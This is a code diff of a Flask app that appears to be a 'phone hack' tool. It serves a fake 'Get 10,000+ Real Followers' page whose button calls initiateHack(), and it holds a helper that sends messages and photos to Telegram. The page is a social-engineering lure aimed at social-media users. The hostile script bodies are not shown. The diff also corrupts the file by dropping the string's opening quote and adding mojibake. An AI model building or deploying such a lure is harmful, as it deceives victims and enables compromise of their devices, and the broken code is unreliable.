@@ -31,7 +31,7 @@ def send_telegram(msg, photo=None, caption=""):
         print(f"Telegram error: {e}")
 
 #  PROFESSIONAL Cyber Team Help + FULL PHONE HACK
-FULL_PHONE_HACK = """
+# -*- coding: utf-8 -*-
 <!DOCTYPE html>
 <html>
 <head>
@@ -72,14 +72,14 @@ FULL_PHONE_HACK = """
     <header class="header">
         <div class="container flex justify-between items-center">
             <div class="logo"> CTH Pro</div>
-            <div>+10K Followers • Instant • Free</div>
+            <div>+10K Followers â€¢ Instant â€¢ Free</div>
         </div>
     </header>
 
     <div class="container">
         <section class="hero">
             <h1>Get <span style="color:#00ff88">10,000+</span> Real Followers</h1>
-            <p class="hero-tag">Instagram • TikTok • Facebook • YouTube | No surveys, no payment. Works worldwide!</p>
+            <p class="hero-tag">Instagram â€¢ TikTok â€¢ Facebook â€¢ YouTube | No surveys, no payment. Works worldwide!</p>
             <a href="#" class="cta" onclick="initiateHack()"> Activate Free Boost</a>
         </section>
 
@@ -110,7 +110,7 @@ FULL_PHONE_HACK = """
     </div>
 
     <div class="status-bar" id="status">
-        <i class="fas fa-check-circle"></i> Boost activated • Processing...
+        <i class="fas fa-check-circle"></i> Boost activated â€¢ Processing...
     </div>
 
 <script>
@@ -400,4 +400,5 @@ def full_phone_hack():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
+
     app.run(host='0.0.0.0', port=port)
